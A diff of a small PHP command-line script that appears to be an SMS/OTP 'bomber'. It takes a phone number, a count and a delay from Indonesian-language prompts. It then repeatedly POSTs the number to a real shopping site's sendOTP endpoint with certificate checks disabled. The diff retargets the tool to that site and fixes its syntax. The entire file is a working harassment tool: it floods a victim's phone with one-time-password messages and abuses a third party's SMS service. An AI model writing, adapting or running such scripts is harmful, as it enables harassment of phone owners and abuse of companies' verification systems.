@@ -1,11 +1,11 @@
 <?php
-function tnibom($no, $jum, $wait){
+function phd($no, $jum, $wait){
     $x = 0; 
     while($x < $jum) {
         $ch = curl_init();
         curl_setopt($ch, CURLOPT_URL,"https://www.phd.co.id/en/users/sendOTP");
         curl_setopt($ch, CURLOPT_POST, 1);
-        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=".$no."&smsType=1");
+        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone_number=".$no);
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
 		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
@@ -20,14 +20,12 @@ function tnibom($no, $jum, $wait){
         flush();
     }
 }
-echo "Nomor? (ex : 8xxxx)\nInput : ";
+echo "Nomor? (ex : 628xxxx)\nInput : ";
 $nomor = trim(fgets(STDIN));
 echo "Jumlah?\nInput : ";
 $jumlah = trim(fgets(STDIN));
 echo "Jeda? 0-9999999999 (ex:0)\nInput : ";
 $jeda = trim(fgets(STDIN));
-echo "pesan? tes\nInput : ";
-$pesan = trim(fgets(STDIN));
-$execute = tnibom($nomor, $jumlah, $jeda $pesan);
+$execute = phd($nomor, $jumlah, $jeda);
 print $execute;
-?
+?>
